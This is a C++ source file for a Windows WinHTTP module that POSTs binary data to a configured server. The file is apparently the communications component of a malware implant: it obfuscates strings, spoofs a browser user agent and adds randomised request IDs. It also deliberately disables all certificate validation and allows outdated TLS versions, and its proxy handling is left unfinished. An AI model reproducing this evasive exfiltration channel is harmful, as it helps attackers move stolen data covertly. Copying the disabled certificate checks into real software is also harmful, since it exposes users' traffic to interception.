// src/communication/HttpsComms.cpp
#include "communication/HttpsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/StringUtils.h"
#include "utils/NetworkUtils.h"
#include <vector>
#include <cstdint>
#include <string>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// Obfuscated strings
static const auto OBF_HTTPS_COMMS = OBFUSCATE("HttpsComms");
static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

HttpsComms::HttpsComms(Configuration* config)
    : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}

HttpsComms::~HttpsComms() {
    Cleanup();
}

bool HttpsComms::Initialize() {
    // Windows implementation với WinHTTP
    std::string userAgentStr = OBF_USER_AGENT;
    std::wstring userAgent(userAgentStr.begin(), userAgentStr.end());

    DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
    LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;

    if (m_config->GetUseProxy()) {
        accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        std::string proxyStr = OBFUSCATE("http://proxy:8080");
        // Convert to wide string if needed
        // You'll need to implement proxy configuration
    }

    m_hSession = WinHttpOpen(
        userAgent.c_str(),
        accessType,
        proxyName,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!m_hSession) {
        LOG_ERROR("Failed to initialize WinHTTP session: " + std::to_string(GetLastError()));
        return false;
    }

    // Configure timeouts
    int timeout = m_config->GetTimeout();
    WinHttpSetTimeouts(
        m_hSession,
        timeout,
        timeout,
        timeout,
        timeout
    );

    // Parse server URL
    std::string url = m_config->GetServerUrl();
    std::wstring wUrl(url.begin(), url.end());

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse server URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);

    // Establish connection
    m_hConnect = WinHttpConnect(
        m_hSession,
        hostName.c_str(),
        urlComp.nPort,
        0
    );

    if (!m_hConnect) {
        LOG_ERROR("Failed to establish HTTPS connection: " + std::to_string(GetLastError()));
        return false;
    }

    // Configure SSL
    if (!ConfigureSslWindows()) {
        LOG_ERROR("Failed to configure SSL");
        return false;
    }

    LOG_INFO("HTTPS communication initialized successfully");
    return true;
}

bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
    // Windows implementation với WinHTTP và SSL
    if (!m_hConnect) {
        LOG_ERROR("HTTPS connection not initialized");
        return false;
    }

    // Parse server URL để lấy path
    std::string url = m_config->GetServerUrl();
    std::wstring wUrl(url.begin(), url.end());

    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse HTTPS URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlPath.empty()) {
        urlPath = L"/";
    }

    // Tạo HTTPS request với WINHTTP_FLAG_SECURE
    HINTERNET hRequest = WinHttpOpenRequest(
        m_hConnect,
        L"POST",
        urlPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest) {
        LOG_ERROR("Failed to create HTTPS request: " + std::to_string(GetLastError()));
        return false;
    }

    // Add headers
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
    headers += "Connection: close\r\n";

    std::wstring wHeaders(headers.begin(), headers.end());

    if (!WinHttpAddRequestHeaders(
        hRequest,
        wHeaders.c_str(),
        static_cast<DWORD>(wHeaders.length()),
        WINHTTP_ADDREQ_FLAG_ADD
    )) {
        LOG_WARN("Failed to add HTTPS headers: " + std::to_string(GetLastError()));
    }

    // Send request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    )) {
        LOG_ERROR("Failed to send HTTPS request: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        LOG_ERROR("Failed to receive HTTPS response: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Check response status
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &size,
        NULL
    );

    bool success = (statusCode >= 200 && statusCode < 300);
    if (!success) {
        LOG_ERROR("HTTPS request failed with status: " + std::to_string(statusCode));
    } else {
        LOG_DEBUG("HTTPS request successful, status: " + std::to_string(statusCode));
    }

    WinHttpCloseHandle(hRequest);
    return success;
}

bool HttpsComms::ConfigureSslWindows() {
    // Configure SSL options for WinHTTP
    DWORD securityFlags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(
        m_hSession,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &securityFlags,
        sizeof(securityFlags)
    )) {
        LOG_ERROR("Failed to set SSL options: " + std::to_string(GetLastError()));
        return false;
    }

    // Set additional SSL options if needed
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 |
                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 |
                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;

    if (!WinHttpSetOption(
        m_hSession,
        WINHTTP_OPTION_SECURE_PROTOCOLS,
        &protocols,
        sizeof(protocols)
    )) {
        LOG_WARN("Failed to set SSL protocols: " + std::to_string(GetLastError()));
        // Continue anyway
    }

    LOG_DEBUG("SSL configuration applied successfully");
    return true;
}

void HttpsComms::Cleanup() {
    if (m_hConnect) {
        WinHttpCloseHandle(m_hConnect);
        m_hConnect = NULL;
    }
    if (m_hSession) {
        WinHttpCloseHandle(m_hSession);
        m_hSession = NULL;
    }

    LOG_DEBUG("HTTPS communication cleaned up");
}

bool HttpsComms::TestConnection() const {
    return utils::NetworkUtils::CheckInternetConnection();
}

std::vector<uint8_t> HttpsComms::ReceiveData() {
    // Implement HTTPS data reception if needed
    return std::vector<uint8_t>();
}